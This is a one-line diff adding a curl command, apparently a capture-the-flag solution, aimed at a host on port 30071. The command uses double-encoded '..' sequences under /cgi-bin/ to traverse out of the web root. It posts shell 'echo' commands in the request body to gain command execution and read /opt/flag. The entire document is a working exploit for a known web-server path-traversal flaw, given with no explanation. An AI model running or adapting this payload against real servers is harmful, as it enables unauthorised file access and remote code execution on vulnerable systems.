@@ -1,0 +1,1 @@
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo;" "http://io.ept.gg:30071/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/opt/flag"
